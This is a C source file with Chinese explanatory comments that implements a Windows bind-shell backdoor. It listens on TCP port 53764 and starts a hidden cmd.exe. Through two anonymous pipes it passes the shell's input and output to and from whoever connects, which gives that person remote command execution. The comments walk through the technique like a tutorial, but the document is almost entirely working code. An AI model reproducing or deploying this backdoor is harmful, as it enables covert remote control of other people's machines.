
#include <winsock2.h>
#include <stdio.h>
#pragma comment (lib,"ws2_32")

int main()
{
        WSADATA wsa;
        SOCKET listenFD;
        char Buff[1024];
        int ret;

        WSAStartup(MAKEWORD(2,2),&wsa);

        listenFD = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

        struct sockaddr_in server;

        server.sin_family = AF_INET;
        server.sin_port = htons(53764);
        server.sin_addr.s_addr=ADDR_ANY;
        ret=bind(listenFD,(sockaddr *)&server,sizeof(server));
        ret=listen(listenFD,2);
        int iAddrSize = sizeof(server);
        SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
/*
        这段代码是用来建立一个Tcp Server的，我们先申请一个socketfd，
        使用53764（随便，多少都行）作为这个socket连接的端口，bind他，
        然后在这个端口上等待连接listen。程序阻塞在accept函数直到有
        client连接上来。
*/
        SECURITY_ATTRIBUTES sa;
        sa.nLength=12;sa.lpSecurityDescriptor=0;sa.bInheritHandle=true;
        HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;

        ret=CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0);
        ret=CreatePipe(&hReadPipe2,&hWritePipe2,&sa,0);
/*
        创建两个匿名管道。hReadPipe只能用来读管道，hWritePipe1只能用来写管道。
*/
        STARTUPINFO si;
        ZeroMemory(&si,sizeof(si));
        si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = hReadPipe2;
        si.hStdOutput = si.hStdError = hWritePipe1;
        char cmdLine[] = "cmd.exe";
        PROCESS_INFORMATION ProcessInformation;

        ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
/*
        这段代码创建了一个shell（cmd.exe），并且把cmd.exe的标准输入用第二个管道
的
        读句柄替换。cmd.exe的标准输出和标准错误输出用第一个管道的写句柄替换。
        这两个管道的逻辑示意图如下：
        (父进程)    read<－－－〔管道一〕<－－－write  标准输出(cmd.exe子进程)
        (父进程)   write－－－>〔管道二〕－－－>read   标准输入(cmd.exe子进程)
*/

        unsigned long lBytesRead;
        while(1)        {
                ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
                if(lBytesRead)  {
                        ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
                        if(!ret)        break;
                        ret=send(clientFD,Buff,lBytesRead,0);
                        if(ret<=0)      break;
                }else   {
                        lBytesRead=recv(clientFD,Buff,1024,0);
                        if(lBytesRead<=0)       break;
                        ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0)
;
                        if(!ret)        break;
                }
        }
/*
        这段代码完成了客户输入和shell的交互。PeekNamedPipe用来异步的查询管道一，
        看看shell是否有输出。如果有就readfile读出来，并发送给客户。如果没有，
        就去接受客户的输入。并writefile写入管道传递给shell.
        这两个管道与client和server的配合逻辑图如下：
        输入命令(Client)        <-- send(父进程)    read<--〔管道一〕<--write
标准输出(cmd.exe子进程)
        获得结果(Client)        recv-->(父进程)write-->〔管道二〕-->read   标准


*/
        return 0;
}
/****************************************************************************/
